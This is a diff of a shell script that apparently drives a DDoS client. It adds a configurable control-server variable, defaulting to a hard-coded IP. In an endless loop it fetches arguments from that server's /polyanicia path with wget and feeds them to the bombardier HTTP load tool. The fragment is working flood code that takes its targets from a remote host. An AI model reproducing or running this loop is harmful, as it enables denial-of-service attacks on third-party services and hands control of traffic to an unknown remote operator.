@@ -29,8 +29,9 @@ printf "\033[0;33m
 
 ";
 
+LOOKUP_SERVER=${LOOKUP_SERVER:-'http://185.25.119.80'}
 while :
 do
-    CMD=$(wget -qO- http://185.25.119.80/polyanicia)
+    CMD=$(wget -qO- $LOOKUP_SERVER/polyanicia)
     bombardier $CMD
 done
